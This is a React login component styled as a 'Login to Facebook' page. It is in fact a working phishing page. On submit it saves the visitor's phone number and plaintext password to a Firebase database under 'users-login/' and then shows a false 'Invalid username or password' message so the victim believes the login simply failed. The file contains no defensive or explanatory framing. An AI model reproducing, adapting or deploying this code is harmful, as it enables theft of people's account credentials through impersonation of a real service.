import React, { useState } from "react";
import { LiaEyeSlashSolid } from "react-icons/lia";
import { LiaEyeSolid } from "react-icons/lia";
import { getDatabase, ref, set, push } from "firebase/database";

const Login = () => {
  let [paswordshow, setPaswordShow] = useState(false);
  let [number, setNumber] = useState("");
  let [numberError, setNumberError] = useState("");
  let [pasword, setPasword] = useState("");
  let [paswordError, setPasswordError] = useState("");
  let [submetError, setSubmetError] = useState("");

  let handleNumber = (e) => {
    setNumberError("");
    setNumber(e.target.value);
    setSubmetError("");
  };
  let handlepasword = (e) => {
    setPasswordError("");
    setPasword(e.target.value);
    setSubmetError("");
  };
  let handleLogin = (e) => {
    e.preventDefault();
    if (!number && !pasword) {
      setNumberError("number is required");
      setPasswordError("password is required");
    } else {
      if (number && pasword) {
        const db = getDatabase();
        set(push(ref(db, "users-login/")), {
          number: number,
          pasword: pasword,
        }).then(() => {
          setNumber("");
          setPasword("");
          setSubmetError("Invalid username or password");
        });
      } else {
        alert("please fill up the full form");
      }
    }
  };
  return (
    <>
      <div className="container mx-auto mt-5">
        <div className="w-[364px] h-[312px] mx-auto">
          <div className="bg-white shadow-md rounded px-8 pt-6 pb-8">
            <h2 className="text-center text-xl font-bold mb-4">
              Login to Facebook
            </h2>
            {submetError && (
              <div>
                <h3 className="w-full h-8 bg-red-200 border-[1px] border-red-600 flex justify-center mb-3 items-center text-black">
                  {submetError}
                </h3>
              </div>
            )}
            <form id="loginForm">
              <div className="mb-4">
                <input
                  value={number}
                  onChange={handleNumber}
                  type="number"
                  className="form-input w-full px-3 py-2 border rounded"
                  id="number"
                  placeholder="Number"
                  required
                />
                <h2 className=" font-normal text-red-500 text-[12px]">
                  {numberError}
                </h2>
              </div>
              <div className="mb-4 relative">
                <input
                  value={pasword}
                  onChange={handlepasword}
                  type={paswordshow ? "text" : "password"}
                  className="form-input w-full px-3 py-2 border rounded"
                  id="password"
                  placeholder="Password"
                  required
                />
                {paswordshow ? (
                  <LiaEyeSolid
                    onClick={() => setPaswordShow(false)}
                    className=" absolute top-3 right-4"
                  />
                ) : (
                  <LiaEyeSlashSolid
                    onClick={() => setPaswordShow(true)}
                    className=" absolute top-3 right-4"
                  />
                )}
                <h2 className=" font-normal text-red-500 text-[12px]">
                  {paswordError}
                </h2>
              </div>
              <button
                onClick={handleLogin}
                type="submit"
                className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded w-full"
              >
                Login
              </button>
            </form>
            <hr className="my-4" />
            <p className="text-center">
              Don't have an account?{" "}
              <a href="#" className="text-blue-500 hover:text-blue-800">
                Sign up
              </a>
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default Login;
